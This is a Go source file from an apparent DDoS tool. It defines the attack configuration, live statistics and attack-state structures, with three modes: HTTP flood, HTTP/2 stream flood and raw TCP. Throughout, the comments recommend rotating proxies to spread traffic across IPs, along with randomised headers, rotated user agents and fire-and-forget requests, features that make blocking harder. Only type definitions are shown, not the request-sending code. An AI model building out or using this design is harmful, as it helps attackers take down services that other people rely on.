package ddos

import (
	"context"
	"sync"
	"time"
)

// AttackMode represents the type of DDoS attack
type AttackMode string

const (
	// ModeFlood sends maximum concurrent HTTP requests (default, most efficient)
	ModeFlood AttackMode = "flood"
	// ModeHTTP2 floods server with HTTP/2 streams (for HTTPS targets)
	ModeHTTP2 AttackMode = "http2"
	// ModeRaw uses raw TCP sockets for maximum throughput (for HTTP targets)
	ModeRaw AttackMode = "raw"
)

// DDoSConfig holds configuration for DDoS attack
type DDoSConfig struct {
	// Required fields
	TargetURL   string // Required: Simple URL (http:// or https://)
	Method      string // GET, POST, etc. (default: GET)
	Headers     map[string]string
	Body        string
	ContentType string
	MaxThreads  int           // Default: 500
	Duration    time.Duration // Default: 60s
	Timeout     time.Duration // Default: 5s
	AttackMode  AttackMode    // flood, http2, raw (default: flood)

	// Proxy settings (optional, but highly recommended for efficiency)
	ProxyList   []string // Auto-loaded from proxy/proxy.txt if available
	RotateProxy bool     // Default: true (distributes load across IPs)

	// Advanced settings (optional, rarely needed)
	RateLimit         int // 0 = unlimited
	FollowRedirects   bool
	UserAgentFile     string // Optional: custom user agents file (default: built-in rotation)
	MaxStreamsPerConn int    // Maximum HTTP/2 streams per connection (default: 100)

	// Efficiency features (all enabled by default for best performance)
	EnableConnectionPooling    bool // Connection pooling for reuse (default: true)
	EnableFireAndForget        bool // Fire-and-forget requests (default: true)
	EnableResponseBodySkipping bool // Skip reading response bodies (default: true)
	EnableRequestRandomization bool // Randomize headers and query params (default: true)

	// Callbacks
	OnProgress func(stats AttackStats)
}

// AttackStats holds real-time statistics
type AttackStats struct {
	RequestsSent      int64
	RequestsSuccess   int64
	RequestsFailed    int64
	BytesSent         int64
	BytesReceived     int64
	ActiveConnections int64
	AvgResponseTime   time.Duration
	ElapsedTime       time.Duration
	RequestsPerSec    float64
	ActiveProxies     int
	DisabledProxies   int

	// Efficiency statistics
	ConnectionsReused int64   // Connection reuse count
	PoolHitRate       float64 // Connection pool efficiency (0-1)
}

// DDoSAttack represents an active DDoS attack
type DDoSAttack struct {
	config DDoSConfig
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup

	// Atomic counters for stats
	requestsSent      int64
	requestsSuccess   int64
	requestsFailed    int64
	bytesSent         int64
	bytesReceived     int64
	activeConns       int64
	totalResponseTime int64 // in nanoseconds

	// Proxy health tracking (optimized)
	proxyManager *ProxyManager // Manages proxy health, selection, and recovery

	startTime time.Time
	running   bool
	mu        sync.Mutex

	// Efficiency components (initialized when needed)
	clientPool     any // *ClientPool - connection pool manager
	requestBuilder any // *RequestBuilder - request builder with randomization

	// Rate limiting
	rateLimiter *TokenBucket // Token bucket rate limiter (when RateLimit > 0)

	// Pool statistics
	poolHits          int64 // Atomic counter for pool hits
	poolMisses        int64 // Atomic counter for pool misses
	totalBatches      int64 // Atomic counter for total batches
	successfulBatches int64 // Atomic counter for successful batches
}
